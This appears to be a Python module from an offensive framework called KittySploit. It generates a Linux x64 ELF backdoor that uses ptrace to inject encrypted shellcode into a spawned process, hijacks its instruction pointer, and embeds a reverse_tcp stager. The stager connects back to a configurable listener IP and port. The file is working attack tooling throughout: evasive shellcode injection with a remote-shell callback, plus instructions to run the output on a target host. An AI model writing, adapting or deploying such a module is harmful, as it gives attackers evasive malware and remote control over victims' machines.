#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Classic ptrace shellcode injection (Linux x64).

Spawns a sacrificial process, attaches with ptrace, remote-mmaps via a libc
syscall gadget, writes encrypted shellcode, and hijacks RIP.
"""

from kittysploit import *
from lib.compile.backdoor_helpers import option_value
from lib.compile.linux_backdoor_helpers import build_encrypted_elf_backdoor
from lib.compile.ptrace_inject import PtraceInjectBuilder


class Module(Backdoor):
    __info__ = {
        "name": "Linux Ptrace Inject Evasion",
        "description": (
            "Generate a Linux x64 ELF that performs classic ptrace injection: "
            "PTRACE_ATTACH, remote mmap via syscall gadget, PTRACE_POKEDATA, RIP hijack."
        ),
        "author": "KittySploit",
        "platform": Platform.LINUX,
        "arch": Arch.X64,
        "references": [
            "https://attack.mitre.org/techniques/T1055.008/",
        ],
    }

    payload_path = OptString(
        "payloads/stagers/linux/x64/reverse_tcp",
        "Payload module path (raw shellcode)",
        True,
    )
    lhost = OptString("127.0.0.1", "Connect-back IP address (reverse payloads)", True)
    lport = OptPort(4444, "Connect-back TCP port (reverse payloads)", True)
    encoder = OptString("", "Encoder module path (optional)", False)
    target_cmd = OptString(
        "/bin/sleep 120",
        "Command spawned as injection host (same UID required for ptrace)",
        False,
    )
    cipher = OptChoice("chacha", "Shellcode encryption type", True, ["chacha", "rc4"])
    sleep = OptInteger(0, "Sleep milliseconds before injection", False)
    output_name = OptString("ptrace_inject_evasion", "Output ELF filename", False)
    optimization = OptChoice(
        "ReleaseSmall",
        "Zig optimization level",
        False,
        ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"],
    )
    save_source = OptBool(False, "Save generated C source alongside the ELF", False, advanced=True)

    def __init__(self, framework=None):
        super().__init__()
        self.framework = framework

    def run(self):
        builder = PtraceInjectBuilder(
            cipher=str(option_value(self, "cipher") or "chacha").lower(),
            sleep_ms=int(option_value(self, "sleep") or 0),
        )
        ok = build_encrypted_elf_backdoor(
            self,
            builder,
            build_source_kwargs={"target_cmd": str(option_value(self, "target_cmd") or "/bin/sleep 120")},
            output_name="ptrace_inject_evasion",
            save_source_name="ptrace_inject.c",
        )
        if ok:
            lhost = str(option_value(self, "lhost") or "127.0.0.1")
            lport = int(option_value(self, "lport") or 4444)
            print_info(f"Target cmd: {option_value(self, 'target_cmd')} | Cipher: {option_value(self, 'cipher')}")
            print_info(f"Embedded callback: {lhost}:{lport} (must match a running reverse_tcp listener)")
            print_info("Run the generated ELF on the target host after starting the listener.")
        return ok
